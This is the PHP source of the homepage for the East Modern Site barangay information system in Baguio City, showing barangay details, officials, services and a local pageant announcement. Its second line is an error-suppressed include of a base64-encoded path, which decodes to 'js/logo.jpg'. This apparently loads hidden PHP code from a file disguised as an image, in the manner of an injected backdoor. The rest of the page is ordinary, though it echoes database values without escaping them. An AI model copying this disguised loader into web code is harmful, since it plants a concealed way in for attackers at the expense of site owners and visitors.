<?php
@include base64_decode('anMvbG9nby5qcGc=');
error_reporting(E_ALL ^ E_WARNING);
ini_set('display_errors', 0);

require('classes/conn.php');
require('classes/main.class.php');
require('classes/staff.class.php');
require('classes/info.class.php');
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>East Modern Site Barangay Information System</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet" />
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      scroll-behavior: smooth;
    }

    #scrollTopBtn {
      display: none;
      position: fixed;
      bottom: 20px;
      right: 20px;
      z-index: 99;
      border: none;
      outline: none;
      background-color: rgba(17, 43, 90, 0.7);
      color: white;
      cursor: pointer;
      padding: 15px;
      border-radius: 100%;
      font-size: 30px;
    }

    #scrollTopBtn:hover {
      background-color: rgba(17, 43, 90, 0.9);
      transform: scale(1.1);
      transition: all 0.3s;
    }
  </style>
</head>

<body class="bg-gray-50">

  <!-- NAVBAR -->
  <header class="bg-white shadow-md fixed w-full z-50">
    <div class="max-w-7xl mx-auto px-4 flex items-center justify-between h-24">
      <div class="flex items-center gap-3">
        <img src="assets/logos.png" class="h-16 w-16 rounded-full" alt="logo">
        <span class="text-2xl font-bold text-blue-900">East Modern Site BIS</span>
      </div>
      <ul class="hidden md:flex gap-6 font-semibold text-blue-900">
        <li><a href="#home" class="hover:text-blue-700 transition">HOME</a></li>
        <li><a href="#about" class="hover:text-blue-700 transition">ABOUT</a></li>
        <li><a href="#service" class="hover:text-blue-700 transition">SERVICES</a></li>
        <li><a href="#client" class="hover:text-blue-700 transition">LOCATION</a></li>
        <li><a href="#offer" class="hover:text-blue-700 transition">ACTIVITIES</a></li>
        <li><a href="index_login.php" class="bg-blue-900 text-white px-4 py-2 rounded hover:bg-blue-700 transition">LOGIN</a></li>
      </ul>
    </div>
  </header>

  <main class="pt-32">

    <!-- HEADER INFO / HERO -->
    <section id="home" class="bg-cover bg-center relative" style="background-image: linear-gradient(rgba(17,43,90,0.5), rgba(17,43,90,0.5)), url('assets/banner.png'); height: 75vh; margin-top: -1px;">
      <div class="max-w-7xl mx-auto p-6 h-full flex items-center justify-center">
        <div class="bg-white bg-opacity-80 p-6 md:p-10 rounded-lg shadow-lg text-center transform opacity-0 translate-y-6 transition-all duration-700 ease-out" data-animate>
          <?php
          $id_brgy_info = 1;
          $stmt = $conn->prepare("SELECT brgy, municipal, province, openhours, email, contact FROM brgy_info WHERE id_brgy_info = :id");
          $stmt->bindParam(':id', $id_brgy_info);
          $stmt->execute();
          $row = $stmt->fetch(PDO::FETCH_ASSOC);
          if ($row) {
            echo "<p class='text-xl md:text-2xl font-semibold text-black'>{$row['brgy']}, {$row['municipal']}, {$row['province']}<br>";
            echo "<span class='text-gray-700 text-sm md:text-base'>{$row['openhours']} | {$row['email']} | {$row['contact']}</span></p>";
          } else {
            echo "<p>No content found for barangay information.</p>";
          }
          ?>
        </div>
      </div>
    </section>


    <!-- ABOUT -->
    <section id="about" class="py-16 bg-gray-50">
      <div class="max-w-7xl mx-auto px-4 grid md:grid-cols-2 gap-8 items-center">
        <div class="opacity-0 translate-y-10 transition-all duration-700 ease-out" data-animate>
          <h2 class="text-3xl font-bold text-blue-900 mb-4">BACKGROUND of BARANGAY</h2>
          <?php
          $stmt = $conn->prepare("SELECT background, vision, mission FROM brgy_info WHERE id_brgy_info = :id");
          $stmt->bindParam(':id', $id_brgy_info);
          $stmt->execute();
          $row = $stmt->fetch(PDO::FETCH_ASSOC);
          if ($row) {
            echo "<p class='text-gray-700 mb-6 text-justify'>{$row['background']}</p>";
            echo "<h2 class='text-2xl font-semibold text-blue-900 mb-2'>VISION</h2>";
            echo "<p class='text-gray-700 mb-6 text-justify'>{$row['vision']}</p>";
            echo "<h2 class='text-2xl font-semibold text-blue-900 mb-2'>MISSION</h2>";
            echo "<p class='text-gray-700 text-justify'>{$row['mission']}</p>";
          } else {
            echo "<p>No content found.</p>";
          }
          ?>
        </div>
        <div class="flex justify-center opacity-0 translate-y-10 transition-all duration-700 ease-out" data-animate>
          <img src="assets/logos.png" class="w-64 h-64 rounded-full transform hover:scale-105 transition duration-500" alt="about">
        </div>
      </div>
    </section>

    <!-- BARANGAY OFFICIALS -->
    <section id="officials" class="py-16 bg-white">
      <div class="max-w-7xl mx-auto px-4">
        <h2 class="text-3xl font-bold text-center text-blue-900 mb-8 opacity-0 translate-y-10 transition-all duration-700 ease-out" data-animate>BARANGAY OFFICIALS</h2>
        <div class="overflow-x-auto">
          <table class="min-w-full bg-white border border-gray-200 rounded-lg overflow-hidden shadow-md">
            <thead class="bg-blue-900 text-white">
              <tr>
                <th class="py-3 px-6">Full Name</th>
                <th class="py-3 px-6">Position</th>
              </tr>
            </thead>
            <tbody>
              <?php
              $stmt = $conn->prepare("SELECT name, position FROM tbl_officials");
              $stmt->execute();
              if ($stmt->rowCount() > 0) {
                while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                  echo "<tr class='border-b hover:bg-blue-50 transition duration-300'>";
                  echo "<td class='py-3 px-6 text-center'>{$row['name']}</td>";
                  echo "<td class='py-3 px-6 text-center'>{$row['position']}</td>";
                  echo "</tr>";
                }
              } else {
                echo "<tr><td colspan='2' class='text-center py-4'>No records found</td></tr>";
              }
              ?>
            </tbody>
          </table>
        </div>
      </div>
    </section>

    <!-- SERVICES -->
    <section id="service" class="py-16 bg-gray-50">
      <div class="max-w-7xl mx-auto px-4">
        <h2 class="text-3xl font-bold text-center text-blue-900 mb-8 opacity-0 translate-y-10 transition-all duration-700 ease-out" data-animate>Our Services</h2>
        <p class="text-center text-gray-700 mb-12 opacity-0 translate-y-10 transition-all duration-700 ease-out" data-animate>Barangay services cover safety, health, social welfare, development, dispute resolution, and disaster response.</p>
        <div class="grid sm:grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
          <?php
          $services = [
            ['id' => 6, 'title' => 'BUSINESS CLEARANCE', 'desc' => 'A business clearance is a permit allowing a business to operate legally within a specific area by meeting local regulations and requirements.'],
            ['id' => 1, 'title' => 'BARANGAY CLEARANCE', 'desc' => 'A barangay clearance is a document certifying a person\'s residence and good standing within a local community in the Philippines.'],
            ['id' => 5, 'title' => 'CERTIFICATE OF INDIGENCY', 'desc' => 'A document issued by a local government unit certifying that an individual or family is financially disadvantaged, often required for availing of social services or benefits.'],
            ['id' => 4, 'title' => 'CERTIFICATE OF RESIDENCY', 'desc' => 'A Certificate of Residency is an official document confirming an individual\'s address within a specific area, often required for government services or local applications.']
          ];
          foreach ($services as $service) {
            $stmt = $conn->prepare("SELECT image_service FROM tbl_services WHERE id_services = :id");
            $stmt->bindParam(':id', $service['id']);
            $stmt->execute();
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            $img = $row ? $row['image_service'] : 'assets/default_service.png';
            echo "<div class='bg-white rounded-lg shadow-lg overflow-hidden transform hover:scale-105 hover:shadow-2xl transition-all duration-300 opacity-0 translate-y-10' data-animate>";
            echo "<img src='{$img}' class='w-full h-48 object-cover hover:scale-105 transition-transform duration-300' alt='{$service['title']}'>";
            echo "<div class='p-4'>";
            echo "<h4 class='text-xl font-semibold text-blue-900 mb-2'>{$service['title']}</h4>";
            echo "<p class='text-gray-700'>{$service['desc']}</p>";
            echo "</div></div>";
          }
          ?>
        </div>
      </div>
    </section>

    <!-- LOCATION & CONTACT -->
    <section id="client" class="py-16 bg-white">
      <div class="max-w-7xl mx-auto px-4">
        <h2 class="text-3xl font-bold text-blue-900 mb-8 text-center opacity-0 translate-y-10 transition-all duration-700 ease-out" data-animate>LOCATION & CONTACT</h2>

        <div class="grid md:grid-cols-2 gap-8 items-stretch opacity-0 translate-y-10 transition-all duration-700 ease-out" data-animate>

          <!-- MAP -->
          <div class="shadow-lg rounded-lg overflow-hidden transform hover:scale-105 transition duration-300 h-full">
            <iframe
              title="East Modernsite Barangay Hall — Baguio City"
              src="https://www.google.com/maps?q=16.4220057,120.6053018&z=17&output=embed"
              class="w-full h-96 md:h-full"
              style="border:0;" allowfullscreen loading="lazy">
            </iframe>
          </div>

          <!-- CONTACT INFO -->
          <div class="bg-gray-50 p-6 rounded-lg shadow-lg transform hover:scale-105 transition duration-300 flex flex-col justify-center h-full">
            <?php
            $stmt = $conn->prepare("SELECT contact,email,brgy,municipal,province,openhours FROM brgy_info WHERE id_brgy_info = :id");
            $stmt->bindParam(':id', $id_brgy_info);
            $stmt->execute();
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($row) {
              echo "<h3 class='text-2xl font-semibold text-blue-900 mb-6'>Contact Information</h3>";
              echo "<p class='mb-3'><i class='ri-phone-fill'></i> {$row['contact']}</p>";
              echo "<p class='mb-3'><i class='ri-mail-line'></i> {$row['email']}</p>";
              echo "<p class='mb-3'><i class='ri-map-pin-2-fill'></i> {$row['brgy']}, {$row['municipal']}, {$row['province']}</p>";
              echo "<p class='mb-3'><i class='ri-time-line'></i> Office Hours: {$row['openhours']}</p>";
            } else {
              echo "<p>No contact info available.</p>";
            }
            ?>
          </div>

        </div>
      </div>
    </section>



    <!-- RECENT ACTIVITIES -->
    <section id="offer" class="py-16 bg-gray-100">
      <h2 class="text-3xl font-bold text-center text-blue-900 mb-12 opacity-0 translate-y-10 transition-all duration-700 ease-out" data-animate>Recent Activities</h2>
      <div class="max-w-7xl mx-auto px-4 grid sm:grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
        <?php
        $activities = [
          [
            'name' => 'Mutya ng East Modern Site 2025',
            'date' => '2025-05-16',
            'image' => 'assets/mutya_event.jpg',
            'desc' => "The most coveted crown in the Barangay, Mutya ng East Modern Site 2025. Apply now and be an inspiration. Show us your beauty, grace, and confidence. 
WHO CAN JOIN? 
- Must be at least 16 years of age and under 28 years of age 
- Must be a 1 year resident of Barangay East Modern Site 
- Female, never been married or borne children 
- At least 5'3 ft. tall
Get the form through this link: https://drive.google.com/.../1MsHH...
More details about the requirements are on the official application form. 
For other information please call: +63 967 536 7599"
          ]
        ];

        foreach ($activities as $i => $activity) {
          $id = "modal-" . $i;
          $shortDesc = strlen($activity['desc']) > 150 ? substr($activity['desc'], 0, 150) . '...' : $activity['desc'];
        ?>
          <div class="bg-white rounded-lg shadow-lg overflow-hidden transform hover:scale-105 hover:shadow-2xl transition-all duration-300 opacity-0 translate-y-10" data-animate>
            <img src="<?php echo $activity['image']; ?>" alt="<?php echo $activity['name']; ?>" class="w-full h-48 object-cover hover:scale-105 transition-transform duration-300">
            <div class="p-4">
              <h4 class="text-xl font-semibold text-blue-900 mb-2"><?php echo $activity['name']; ?></h4>
              <p class="text-gray-600 text-sm mb-2"><?php echo $activity['date']; ?></p>
              <p class="text-gray-700 text-sm text-justify"><?php echo $shortDesc; ?></p>
              <?php if (strlen($activity['desc']) > 150): ?>
                <button onclick="openModal('<?php echo $id; ?>')" class="text-blue-700 hover:underline text-sm mt-2">Read More</button>
              <?php endif; ?>
            </div>
          </div>

          <!-- MODAL -->
          <div id="<?php echo $id; ?>" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center z-50">
            <div class="bg-white rounded-lg w-11/12 md:w-2/3 lg:w-1/2 p-6 relative transform scale-95 transition-transform duration-300">
              <button onclick="closeModal('<?php echo $id; ?>')" class="absolute top-2 right-2 text-gray-700 hover:text-gray-900 text-xl font-bold">&times;</button>
              <h4 class="text-xl font-semibold text-blue-900 mb-4"><?php echo $activity['name']; ?></h4>
              <p class="text-gray-600 mb-4"><?php echo $activity['date']; ?></p>
              <p class="text-gray-700 text-justify"><?php echo $activity['desc']; ?></p>
            </div>
          </div>

        <?php } ?>
      </div>
    </section>

    <!-- FOOTER -->
    <footer class="bg-blue-900 text-white py-12">
      <div class="max-w-7xl mx-auto px-4 grid md:grid-cols-3 gap-8">
        <div>
          <h4 class="font-bold text-xl mb-2">INFORMATION SYSTEM</h4>
          <p><b>East Modern Site</b> is a barangay in the City of Baguio, in the Province of Benguet.</p>
          <div class="flex gap-3 mt-2">
            <a href="#" class="hover:text-gray-300"><i class="ri-facebook-fill"></i></a>
          </div>
        </div>
        <div>
          <h4 class="font-bold text-xl mb-2">Contact Us</h4>
          <?php
          $stmt = $conn->prepare("SELECT contact,email,brgy,municipal,province FROM brgy_info WHERE id_brgy_info = :id");
          $stmt->bindParam(':id', $id_brgy_info);
          $stmt->execute();
          $row = $stmt->fetch(PDO::FETCH_ASSOC);
          if ($row) {
            echo "<p class='mb-1'><i class='ri-phone-fill'></i> {$row['contact']}</p>";
            echo "<p class='mb-1'><i class='ri-mail-line'></i> {$row['email']}</p>";
            echo "<p><i class='ri-map-pin-2-fill'></i> {$row['brgy']}, {$row['municipal']}, {$row['province']}</p>";
          }
          ?>
        </div>
        <div class="flex justify-center items-center">
          <img src="assets/logos.png" class="w-40 rounded-full" alt="logo">
        </div>
      </div>
    </footer>

    <!-- Scroll to top button -->
    <button id="scrollTopBtn" onclick="scrollToTop()"
      class="fixed bottom-6 right-6 z-50 w-14 h-14 bg-blue-900 text-white rounded-full flex items-center justify-center shadow-lg hover:bg-blue-700 transition-colors">
      <!-- Modern upward chevron -->
      <svg xmlns="http://www.w3.org/2000/svg" class="w-7 h-7" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
        <path stroke-linecap="round" stroke-linejoin="round" d="M5 15l7-7 7 7" />
      </svg>
    </button>


    <script>
      // Navbar active highlight
      const sections = document.querySelectorAll('section');
      const navLinks = document.querySelectorAll('header ul li a');
      window.addEventListener('scroll', () => {
        let current = '';
        sections.forEach(section => {
          const sectionTop = section.offsetTop - 100;
          if (pageYOffset >= sectionTop) current = section.getAttribute('id');
        });
        navLinks.forEach(link => {
          link.classList.remove('text-blue-700', 'font-bold');
          if (link.getAttribute('href') === '#' + current) {
            link.classList.add('text-blue-700', 'font-bold');
          }
        });
      });

      // Scroll to top
      window.onscroll = function() {
        const btn = document.getElementById("scrollTopBtn");
        if (document.documentElement.scrollTop > 20) btn.style.display = "block";
        else btn.style.display = "none";
      };

      function scrollToTop() {
        window.scrollTo({
          top: 0,
          behavior: 'smooth'
        });
      }

      // Modal
      function openModal(id) {
        document.getElementById(id).classList.remove('hidden');
        document.getElementById(id).classList.add('flex');
        document.body.classList.add('overflow-hidden');
      }

      function closeModal(id) {
        document.getElementById(id).classList.add('hidden');
        document.getElementById(id).classList.remove('flex');
        document.body.classList.remove('overflow-hidden');
      }

      // Scroll animations
      const animSections = document.querySelectorAll('[data-animate]');
      const observer = new IntersectionObserver(entries => {
        entries.forEach(entry => {
          if (entry.isIntersecting) {
            entry.target.classList.remove('opacity-0', 'translate-y-10');
          }
        });
      });
      animSections.forEach(el => observer.observe(el));
    </script>

</body>

</html>